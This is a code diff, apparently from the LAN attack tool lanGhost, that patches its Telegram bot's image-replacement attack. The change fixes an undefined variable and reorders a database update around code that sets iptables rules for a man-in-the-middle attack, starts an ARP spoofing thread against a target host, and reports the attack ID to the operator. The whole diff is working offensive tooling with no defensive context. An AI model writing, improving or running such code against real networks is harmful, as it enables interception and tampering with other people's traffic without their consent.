@@ -581,17 +581,17 @@ def msg_img(bot, update):
 
                     target = json.loads(attack[1])
 
-                    DBcursor.execute("UPDATE lanGhost_img SET img=?, attackid=?  WHERE target=?", [img64, str(ID), attack[1]])
-                    DBconn.commit()
-
                     iptables("mitm", target=target[0])
-                    if not attackManager("isattacked", target=target_ip):
+                    if not attackManager("isattacked", target=target[0]):
                         ID = attackManager("new", attack_type="replaceimg", target=target[0])
                         arp_thread = threading.Thread(target=arpSpoof, args=[target])
                         arp_thread.daemon = True
                         arp_thread.start()
                     else:
                         ID = attackManager("new", attack_type="replaceimg", target=target[0])
+
+                    DBcursor.execute("UPDATE lanGhost_img SET img=?, attackid=?  WHERE target=?", [img64, str(ID), attack[1]])
+                    DBconn.commit()
 
                     bot.send_message(chat_id=update.message.chat_id, text="Starting attack with ID: " + str(ID))
                     bot.send_message(chat_id=update.message.chat_id, text="Type /stop " + str(ID) + " to stop the attack.")
